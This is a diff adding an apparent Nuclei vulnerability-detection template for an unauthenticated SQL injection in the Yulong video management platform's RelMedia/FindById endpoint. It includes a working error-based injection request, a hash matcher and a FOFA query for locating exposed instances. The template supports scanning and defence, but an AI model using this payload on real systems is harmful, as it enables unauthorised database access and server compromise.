@@ -1,0 +1,25 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - ~e10adc3949ba59abbe56e057f20f883
+      raw:
+        - |
+          POST /index.php?r=RelMedia/FindById HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+          Content-Type: application/x-www-form-urlencoded
+
+          id=1+and+updatexml(1,concat(0x7e,MD5(123456),0x7e),1)--+
+id: yulong-RelMedia_FindById-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: body="PView 视音频管理平台"
+        誉龙视音频综合管理平台 RelMedia/FindById 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 誉龙视音频综合管理平台 RelMedia/FindById SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487645&idx=1&sn=114868f726b8a42a52d98f24b92ea737&chksm=c267a5aef5102cb8724d40784288c9075e88c9b75042b650b5435076a1c1c857d807a5bf0454&token=1439003696&lang=zh_CN#rd
+    severity: high
+    tags: []
